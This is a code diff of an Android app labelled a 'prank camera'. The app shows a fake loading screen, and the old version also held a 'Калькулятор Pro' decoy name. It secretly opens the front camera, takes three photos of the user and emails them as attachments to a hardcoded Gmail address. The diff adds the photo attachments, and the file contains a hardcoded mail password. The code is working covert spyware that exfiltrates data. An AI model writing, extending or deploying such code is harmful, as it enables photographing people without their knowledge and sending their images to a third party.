@@ -1,7 +1,5 @@
 package com.prank.camera;
 
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.hardware.Camera;
 import android.os.Bundle;
 import android.os.Handler;
@@ -14,74 +12,71 @@ import android.widget.TextView;
 
 import androidx.appcompat.app.AppCompatActivity;
 
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Properties;
 
+import javax.activation.DataHandler;
+import javax.activation.DataSource;
 import javax.mail.Authenticator;
 import javax.mail.Message;
+import javax.mail.Multipart;
 import javax.mail.PasswordAuthentication;
 import javax.mail.Session;
 import javax.mail.Transport;
 import javax.mail.internet.InternetAddress;
+import javax.mail.internet.MimeBodyPart;
 import javax.mail.internet.MimeMessage;
+import javax.mail.internet.MimeMultipart;
+import javax.mail.util.ByteArrayDataSource;
 
 public class MainActivity extends AppCompatActivity implements SurfaceHolder.Callback {
 
     private static final String TAG = "PrankCamera";
     private static final int PHOTO_COUNT = 3;
-    private static final int PHOTO_INTERVAL_MS = 2000;
-    private static final int START_DELAY_MS = 1500; // задержка после открытия
+    private static final int PHOTO_INTERVAL_MS = 2500;
+    private static final int START_DELAY_MS = 1500;
 
     private static final String EMAIL_FROM = "metrobugitt@gmail.com";
     private static final String EMAIL_TO = "metrobugitt@gmail.com";
-    private static final String EMAIL_SUBJECT = "Prank Camera Photos";
+    private static final String EMAIL_SUBJECT = "Prank Camera!";
     private static final String EMAIL_PASSWORD = "umlvmsubioyndabu";
 
-    // Приманка — показываем что-то безобидное
-    private static final String FAKE_APP_NAME = "Калькулятор Pro";
-    private static final String FAKE_LOADING_TEXT = "Загрузка...";
-
     private SurfaceView surfaceView;
-    private SurfaceHolder surfaceHolder;
     private Camera camera;
     private TextView txtFake;
 
-    private Handler handler = new Handler(Looper.getMainLooper());
+    private final Handler handler = new Handler(Looper.getMainLooper());
     private int photoCount = 0;
-    private StringBuilder photoLog;
     private boolean prankStarted = false;
+    private final List<byte[]> photos = new ArrayList<>();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-
-        // Экран не гаснет
         getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
 
         txtFake = findViewById(R.id.txtFake);
         surfaceView = findViewById(R.id.surfaceView);
-        surfaceHolder = surfaceView.getHolder();
-        surfaceHolder.addCallback(this);
+        surfaceView.getHolder().addCallback(this);
 
-        // Показываем приманку
-        txtFake.setText(FAKE_LOADING_TEXT);
+        txtFake.setText("Загрузка...");
     }
 
     @Override
     public void surfaceCreated(SurfaceHolder holder) {
         try {
-            // Открываем фронтальную камеру
             int cameraId = getFrontCameraId();
-            if (cameraId != -1) {
-                camera = Camera.open(cameraId);
-                camera.setPreviewDisplay(holder);
-                camera.startPreview();
+            if (cameraId == -1) return;
 
-                // Запускаем пранк через 1.5 сек — камера успела прогреться
-                handler.postDelayed(this::startPrank, START_DELAY_MS);
-            }
+            camera = Camera.open(cameraId);
+            camera.setPreviewDisplay(holder);
+            camera.startPreview();
+
+            handler.postDelayed(this::startPrank, START_DELAY_MS);
         } catch (Exception e) {
-            Log.e(TAG, "Camera error: " + e.getMessage());
+            Log.e(TAG, "surfaceCreated error: " + e.getMessage());
         }
     }
 
@@ -98,43 +93,39 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
     private void startPrank() {
         if (prankStarted || camera == null) return;
         prankStarted = true;
+        photos.clear();
         photoCount = 0;
-        photoLog = new StringBuilder();
-        takeNextPhoto();
+        scheduleNextPhoto(0);
     }
 
-    private void takeNextPhoto() {
-        if (photoCount >= PHOTO_COUNT) {
-            sendEmailWithPhotos();
-            return;
-        }
-        photoCount++;
-        try {
-            camera.takePicture(null, null, null, pictureCallback);
-        } catch (Exception e) {
-            Log.e(TAG, "takePicture error: " + e.getMessage());
-            handler.postDelayed(this::takeNextPhoto, 1000);
-        }
+    private void scheduleNextPhoto(long delay) {
+        handler.postDelayed(() -> {
+            if (camera == null) return;
+            try {
+                camera.takePicture(null, null, null, (data, cam) -> {
+                    // сохраняем байты фото
+                    photos.add(data);
+                    photoCount++;
+                    Log.d(TAG, "Photo saved: " + photoCount + " size=" + data.length);
+
+                    cam.startPreview();
+
+                    if (photoCount < PHOTO_COUNT) {
+                        scheduleNextPhoto(PHOTO_INTERVAL_MS);
+                    } else {
+                        // Все фото сделаны — отправляем
+                        handler.post(() -> txtFake.setText("Готово!"));
+                        sendEmail();
+                    }
+                });
+            } catch (Exception e) {
+                Log.e(TAG, "takePicture error: " + e.getMessage());
+                if (photoCount < PHOTO_COUNT) scheduleNextPhoto(PHOTO_INTERVAL_MS);
+            }
+        }, delay);
     }
 
-    private final Camera.PictureCallback pictureCallback = (data, cam) -> {
-        photoLog.append("Photo #").append(photoCount).append("\n");
-
-        // Показываем фото мельком (можно убрать)
-        Bitmap bmp = BitmapFactory.decodeByteArray(data, 0, data.length);
-        Log.d(TAG, "Photo taken: " + photoCount);
-
-        cam.startPreview();
-
-        if (photoCount < PHOTO_COUNT) {
-            handler.postDelayed(this::takeNextPhoto, PHOTO_INTERVAL_MS);
-        } else {
-            sendEmailWithPhotos();
-        }
-    };
-
-    private void sendEmailWithPhotos() {
-        txtFake.setText("Готово!");
+    private void sendEmail() {
         new Thread(() -> {
             try {
                 Properties props = new Properties();
@@ -146,8 +137,8 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
                 props.put("mail.smtp.socketFactory.port", "465");
                 props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
                 props.put("mail.smtp.socketFactory.fallback", "false");
-                props.put("mail.smtp.timeout", "10000");
-                props.put("mail.smtp.connectiontimeout", "10000");
+                props.put("mail.smtp.timeout", "15000");
+                props.put("mail.smtp.connectiontimeout", "15000");
 
                 Session session = Session.getInstance(props, new Authenticator() {
                     @Override
@@ -160,13 +151,30 @@ public class MainActivity extends AppCompatActivity implements SurfaceHolder.Cal
                 message.setFrom(new InternetAddress(EMAIL_FROM));
                 message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(EMAIL_TO));
                 message.setSubject(EMAIL_SUBJECT);
-                message.setText("Prank!\n\n" + photoLog.toString() + "\nGotcha!");
 
+                // Multipart — текст + фото как вложения
+                Multipart multipart = new MimeMultipart();
+
+                // Текст
+                MimeBodyPart textPart = new MimeBodyPart();
+                textPart.setText("Gotcha! " + photos.size() + " photos taken!");
+                multipart.addBodyPart(textPart);
+
+                // Прикрепляем каждое фото
+                for (int i = 0; i < photos.size(); i++) {
+                    MimeBodyPart photoPart = new MimeBodyPart();
+                    DataSource ds = new ByteArrayDataSource(photos.get(i), "image/jpeg");
+                    photoPart.setDataHandler(new DataHandler(ds));
+                    photoPart.setFileName("photo_" + (i + 1) + ".jpg");
+                    multipart.addBodyPart(photoPart);
+                }
+
+                message.setContent(multipart);
                 Transport.send(message);
-                Log.d(TAG, "Email sent!");
+                Log.d(TAG, "Email sent with " + photos.size() + " photos!");
 
             } catch (Exception e) {
-                Log.e(TAG, "Email error: " + e.getClass().getSimpleName() + " - " + e.getMessage(), e);
+                Log.e(TAG, "Email error: " + e.getClass().getSimpleName() + ": " + e.getMessage(), e);
             }
         }).start();
     }
